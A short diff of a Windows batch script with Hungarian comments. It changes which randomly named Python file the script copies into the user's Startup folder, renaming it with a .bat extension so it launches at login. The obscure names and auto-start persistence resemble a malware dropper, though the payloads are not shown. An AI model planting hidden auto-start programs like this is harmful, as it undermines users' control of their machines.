@@ -56,8 +56,7 @@ if not exist "%STARTUP_FOLDER%" (
 )
 
 :: .py fájlok bemásolása Startupba
-copy "%~dp0spwww743g7w.py" "%STARTUP_FOLDER%\spwww743g7w.py" /Y >nul
-copy "%~dp0fwsendbfgw.py" "%STARTUP_FOLDER%\fwsendbfgw.py" /Y >nul
+copy "%~dp0spwww743g7w.py" "%STARTUP_FOLDER%\vw2i45ibzfrun2.bat" /Y >nul
 
 :: program indítás
 echo Program indítása innen:
@@ -70,5 +69,6 @@ echo spw elindult.
 echo.
 echo Kész.
 pause
+
 
 
